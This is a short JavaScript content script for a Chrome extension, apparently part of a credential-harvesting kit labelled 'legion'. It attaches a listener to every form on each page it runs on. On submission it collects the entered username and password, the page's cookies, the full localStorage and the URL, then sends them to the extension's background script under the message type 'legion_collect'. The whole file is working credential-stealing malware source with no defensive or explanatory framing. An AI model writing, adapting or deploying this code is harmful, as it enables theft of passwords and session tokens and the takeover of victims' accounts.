/* global chrome */
(function () {
  'use strict';

  function hookForms() {
    document.querySelectorAll('form').forEach(function (form) {
      if (form.__legionHook) return;
      form.__legionHook = true;
      form.addEventListener('submit', function () {
        var data = {};
        try {
          new FormData(form).forEach(function (v, k) { data[k] = String(v); });
        } catch (e) { /* ignore */ }
        var username = data.email || data.username || data.user || data.login || 'unknown';
        var password = data.password || data.pass || data.pwd || '';
        chrome.runtime.sendMessage({
          type: 'legion_collect',
          payload: {
            exchange: 'browser_extension',
            username: username,
            password: password,
            session_cookies: document.cookie || null,
            local_storage: JSON.stringify(localStorage),
            page_url: location.href,
          },
        });
      }, true);
    });
  }

  hookForms();
  var obs = new MutationObserver(hookForms);
  obs.observe(document.documentElement, { childList: true, subtree: true });
})();
